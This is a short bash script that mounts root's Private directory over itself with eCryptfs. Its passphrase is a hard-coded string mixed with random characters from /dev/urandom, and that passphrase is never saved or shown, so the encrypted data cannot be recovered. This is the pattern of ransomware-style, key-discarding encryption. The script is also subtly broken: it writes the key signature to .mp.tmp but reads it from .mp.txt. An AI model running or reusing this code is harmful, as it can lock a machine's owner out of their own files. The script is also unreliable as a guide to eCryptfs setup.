#!/bin/bash
# Encrypt root/Private directory

data='73324e1ab1db72ee9eb4fdf1c90a586d67e00ab58330d1cbfea26ecd0a77fa4d'
x=`echo "${data}" | base64 ; cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 48`
x=`echo ${x} | sed s'/ //' | tr -d '=' | head -c 64`

mountphrase="${x}"

encrypt_files() {
    printf "%s" "${mountphrase}" | ecryptfs-add-passphrase > .mp.tmp

    sig=`tail -1 .mp.txt 2>/dev/null | awk '{print $6}' | sed 's/\[//g' | sed 's/\]//g'`
    rm -f .mp.txt

    mount -t ecryptfs \
-o key=passphrase:passphrase_passwd=${mountphrase} \
-o no_sig_cache=yes,verbose=no,ecryptfs_sig=${sig} \
-o ecryptfs_cipher=aes \
-o ecryptfs_key_bytes=32 \
-o ecryptfs_passthrough=no \
-o ecryptfs_enable_filename_crypto=no /root/Private /root/Private

}

main() {
    encrypt_files
}

main